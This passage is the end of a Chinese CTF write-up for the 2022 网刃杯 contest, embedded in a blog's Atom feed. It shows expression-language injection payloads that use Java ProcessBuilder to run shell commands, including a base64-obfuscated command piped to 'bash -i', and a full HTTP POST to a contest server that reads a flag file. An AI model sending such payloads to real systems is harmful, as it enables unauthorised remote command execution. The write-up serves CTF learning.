class="string">&quot;&#123;echo,bHMgL3xiYXNlNjQ=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span>.start<span class="literal">()</span>.get<span class="constructor">InputStream()</span>, <span class="string">&quot;gbk&quot;</span>)).read<span class="constructor">Line()</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-93.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-94.png" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test388</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.173.163:8022</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8238F74DDCDE5A0ED8C862BC1D78B1DA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>161</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">name=#&#123;<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">new</span> <span class="params">java</span>.<span class="params">io</span>.InputStreamReader(<span class="params">new</span> ProcessBuilder(<span class="params">new</span> String[]&#123;<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/f1AgJvav&quot;</span>&#125;)</span>.start<span class="literal">()</span>.get<span class="constructor">InputStream()</span>, <span class="string">&quot;gbk&quot;</span>)).read<span class="constructor">Line()</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2022-第二届网刃杯/image-95.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">如有不对，请师父不吝赐教~</summary>
    
    
    
    <category term="CTF Contest" scheme="https://nack0c.github.io/categories/CTF-Contest/"/>
    
    
    <category term="CTF" scheme="https://nack0c.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
